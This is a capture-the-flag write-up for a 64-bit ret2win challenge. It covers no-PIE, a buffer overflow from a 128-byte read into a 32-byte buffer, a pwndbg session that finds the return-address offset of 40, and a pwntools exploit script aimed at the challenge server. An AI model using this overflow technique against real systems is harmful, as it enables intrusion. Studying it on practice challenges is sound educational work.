@@ -1,0 +1,119 @@
+This is about the basics of binary exploitation using ret2win attack.
+
+The challenge presents us with a vuln binary which is 64 bit as evident from the `file` command and the checksec shows that exposes NO PIE and NX bit set. 
+
+1. Fixed Memory Addresses
+
+-> With PIE: The operating system loads the program into a random location in memory every single time it runs (a security feature known as ASLR—Address Space Layout Randomization).   
+
+-> With no PIE: The program is compiled to be loaded at a fixed, hardcoded memory address every time it runs.
+
+2. Security Implications
+
+-> Lower Security: Because no PIE binaries load at predictable, static memory addresses, they are generally more vulnerable to certain types of memory exploitation (such as buffer overflows or return-oriented programming / ROP attacks), assuming other mitigations aren't bypassing it. Attackers can easily hardcode exact memory addresses for functions or gadgets.
+
+-> Why it exists: Some older software, specific performance-critical applications, or certain debugging/reversing workflows require non-PIE binaries because managing fixed addresses simplifies how code interacts with memory.
+
+When we analyze the source code we notice that the read function takes in 128 bytes but the buf is just 32 bytes which means there is a buffer overflow vulnerability. 
+When we analyze the binary using gdb we notice that the registers are 64 bits (thats why it is a 64-bit binary) but the thing to notice is that x64 v/s x86: x64 elfs have registers with r as in rip (instruction pointer 64-bit) while the x86 elfs will have registers with e as in eip (instruction pointer 32-bit). 
+
+Now the task is to overwrite the return address (classic ret2win exploit)
+
+Using pwndbg we get that the return address is at an offset of 40
+
+pwndbg> p win
+$1 = {<text variable, no debug info>} 0x401256 <win>
+pwndbg> cyclic 200 -n 8
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+pwndbg> run
+Starting program: /home/ff02x9e/ctf-challs/picoCTF/temp/echo_escape_1/vuln
+Downloading separate debug info for system-supplied DSO at 0x7ffff7fc5000
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Welcome to the secure echo service!
+Please enter your name: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+Hello, aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa      &M      pc]
+Thank you for using our service.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000401388 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────
+ RAX  0
+ RBX  0x7fffffffd568 —▸ 0x7fffffffda17 ◂— '/home/ff02x9e/ctf-challs/picoCTF/temp/echo_escape_1/vuln'
+ RCX  0
+ RDX  0
+ RDI  0x7ffff7f8f7b0 (_IO_stdfile_1_lock) ◂— 0
+ RSI  0x4052a0 ◂— 0x6f79206b6e616854 ('Thank yo')
+ R8   0
+ R9   0
+ R10  0
+ R11  0x202
+ R12  0
+ R13  0x7fffffffd578 —▸ 0x7fffffffda50 ◂— 'SHELL=/bin/bash'
+ R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe5f0 ◂— 0
+ R15  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401220 (__do_global_dtors_aux) ◂— endbr64
+ RBP  0x6161616161616165 ('eaaaaaaa')
+ RSP  0x7fffffffd458 ◂— 0x6161616161616166 ('faaaaaaa')
+ RIP  0x401388 (main+132) ◂— ret
+────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────
+   0x40137d <main+121>    call   puts@plt                    <puts@plt>
+
+   0x401382 <main+126>    mov    eax, 0     EAX => 0
+   0x401387 <main+131>    leave
+ ► 0x401388 <main+132>    ret                                <0x6161616161616166>
+    ↓
+
+
+
+
+
+──────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffd458 ◂— 0x6161616161616166 ('faaaaaaa')
+01:0008│     0x7fffffffd460 ◂— 0x6161616161616167 ('gaaaaaaa')
+02:0010│     0x7fffffffd468 ◂— 0x6161616161616168 ('haaaaaaa')
+03:0018│     0x7fffffffd470 ◂— 0x6161616161616169 ('iaaaaaaa')
+04:0020│     0x7fffffffd478 ◂— 0x616161616161616a ('jaaaaaaa')
+05:0028│     0x7fffffffd480 ◂— 0x616161616161616b ('kaaaaaaa')
+06:0030│     0x7fffffffd488 ◂— 0x616161616161616c ('laaaaaaa')
+07:0038│     0x7fffffffd490 ◂— 0x616161616161616d ('maaaaaaa')
+────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
+ ► 0 0x401388           main+132
+   1 0x6161616161616166
+   2 0x6161616161616167
+   3 0x6161616161616168
+   4 0x6161616161616169
+   5 0x616161616161616a
+   6 0x616161616161616b
+   7 0x616161616161616c
+───────────────────────────────────────────────────[ LAST SIGNAL ]───────────────────────────────────────────────────
+Program received signal SIGSEGV (fault address: 0x0).
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> qaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+❌️ Undefined command: "qaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa".  Try "help".
+pwndbg> cyclic -n 8 -l 0x6161616161616166
+Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
+Found at offset 40
+pwndbg>
+
+Now we can write the script and pwn the challenge.
+
+from pwn import *
+
+HOST = "xebec.cylabacademy.net"
+PORT = 33684
+
+p = remote(HOST,PORT)
+
+p.recvuntil(b"Please enter your name: ")
+
+offset = 40
+
+win_addr = 0x401256
+
+payload = b"A" * offset + p64(win_addr)
+
+p.sendline(payload)
+p.interactive()
+
+
